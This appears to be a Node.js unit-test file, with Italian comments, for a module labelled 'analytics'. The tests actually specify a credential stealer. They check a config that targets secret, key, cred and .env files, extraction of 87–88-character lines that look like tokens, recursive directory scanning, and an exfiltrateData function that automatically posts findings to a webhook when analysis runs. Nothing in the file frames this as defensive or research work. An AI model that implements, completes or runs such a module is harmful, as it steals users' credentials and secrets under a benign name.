const fs = require('fs');
const path = require('path');
const assert = require('assert');

// Mock per axios
const mockAxios = {
  post: (url, data) => {
    console.log('Mock axios.post called:', url, 'with', Object.keys(data).length, 'keys');
    return Promise.resolve({ status: 200, data: { success: true } });
  }
};

// Mock per fs-extra
const mockFs = {
  readFile: (file, encoding) => {
    if (file.includes('test1.txt')) {
      return Promise.resolve('Line 1\nLine 2\nLine 3');
    } else if (file.includes('test2.txt')) {
      return Promise.resolve(
        'This is a test line with exactly 87 characters. 1234567890123456789012345678901234567890123456789012345678901234567\n' +
        'This is a test line with exactly 88 characters. 12345678901234567890123456789012345678901234567890123456789012345678'
      );
    } else {
      return Promise.resolve('');
    }
  },
  readdir: (dir, options) => {
    if (dir.includes('test_dir')) {
      return Promise.resolve([
        'file1.txt',
        'secret.txt',
        'config.env',
        'subdir'
      ]);
    } else if (dir.includes('test_dir/subdir')) {
      return Promise.resolve(['file2.txt']);
    } else {
      return Promise.resolve([]);
    }
  },
  writeFile: (file, content) => {
    console.log('Mock fs.writeFile called:', file);
    return Promise.resolve();
  },
  mkdir: (dir, options) => Promise.resolve(),
  exists: (file) => Promise.resolve(true)
};

// Test config
const config = require('../src/config');
assert.strictEqual(config.endpoint, 'http://localhost:3000/webhook');
assert.deepStrictEqual(config.targetPatterns, ['secret', 'key', 'cred', 'config', '.env']);
assert.strictEqual(config.minLineLength, 87);
assert.strictEqual(config.maxLineLength, 88);
assert.strictEqual(config.autoExfiltrate, true);
assert.strictEqual(config.exfilTrigger, 'on_analyze');

console.log('✅ Config test passato');

// Test funzione isTargetFile
const { isTargetFile } = require('../src/analytics');
assert.strictEqual(isTargetFile('/home/user/secret.txt'), true);
assert.strictEqual(isTargetFile('/home/user/document.txt'), false);
assert.strictEqual(isTargetFile('/home/user/config.env'), true);
assert.strictEqual(isTargetFile('/home/user/key.pem'), true);

console.log('✅ isTargetFile test passato');

// Test funzione extractSuspiciousLines
const { extractSuspiciousLines } = require('../src/analytics');
const testContent = 'Line 1\nLine 2\nThis is a test line with exactly 87 characters. 1234567890123456789012345678901234567890123456789012345678901234567\n' +
                   'This is a test line with exactly 88 characters. 12345678901234567890123456789012345678901234567890123456789012345678\nLine 3';
const suspicious = extractSuspiciousLines(testContent);
assert.strictEqual(suspicious.length, 2);
assert.strictEqual(suspicious[0].length, 87);
assert.strictEqual(suspicious[1].length, 88);

console.log('✅ extractSuspiciousLines test passato');

// Test funzione scanDirectory (mock)
const { scanDirectory } = require('../src/analytics');
async function testScanDirectory() {
  const findings = await scanDirectory('/test_dir');
  assert.strictEqual(findings.length, 2); // secret.txt e config.env
  assert.strictEqual(findings[0].file.includes('secret.txt'), true);
  assert.strictEqual(findings[1].file.includes('config.env'), true);
}

testScanDirectory().then(() => {
  console.log('✅ scanDirectory test passato');
}).catch(err => {
  console.error('❌ scanDirectory test fallito:', err);
});

// Test funzione exfiltrateData (mock)
const { exfiltrateData } = require('../src/analytics');
async function testExfiltrateData() {
  const mockFindings = [{
    file: '/test/secret.txt',
    directory: '/test',
    suspiciousLines: ['Line with 87 chars...'],
    lineCount: 1,
    totalLines: 10
  }];
  
  const result = await exfiltrateData(mockFindings);
  assert.strictEqual(result.status, 200);
}

testExfiltrateData().then(() => {
  console.log('✅ exfiltrateData test passato');
}).catch(err => {
  console.error('❌ exfiltrateData test fallito:', err);
});

console.log('📊 Tutti i test unitari completati!');